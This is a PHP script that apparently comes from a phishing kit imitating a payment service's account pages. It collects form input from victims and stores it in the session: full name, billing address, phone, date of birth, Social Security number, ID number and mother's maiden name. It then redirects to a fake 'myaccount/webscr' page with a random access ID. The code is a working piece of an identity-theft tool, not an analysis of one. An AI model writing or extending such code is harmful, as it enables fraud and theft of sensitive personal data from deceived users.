<?php
require_once __DIR__ . '/../function.php';

$_SESSION['bill_name']      = $_POST['fi_name']." | ".$_POST['la_name'];
$_SESSION['bill_address1']  = $_POST['address_1'];
$_SESSION['bill_address2']  = $_POST['address_2'];
$_SESSION['bill_city']      = $_POST['city'];
$_SESSION['bill_state']     = $_POST['state'];
$_SESSION['bill_zip']       = $_POST['postal'];
$_SESSION['bill_phone']     = $_POST['phone'];
$_SESSION['dob']            = $_POST['day']." / ".$_POST['month']." / ".$_POST['year'];
$_SESSION['ssn']            = $_POST['number_1']." - ".$_POST['number_2']." - ".$_POST['number_3'];
$_SESSION['id_number']      = $_POST['id_number'];
$_SESSION['mother']         = $_POST['mother'];

$api->redirect("../myaccount/webscr?accessID=".$api->ngerandom());
?>
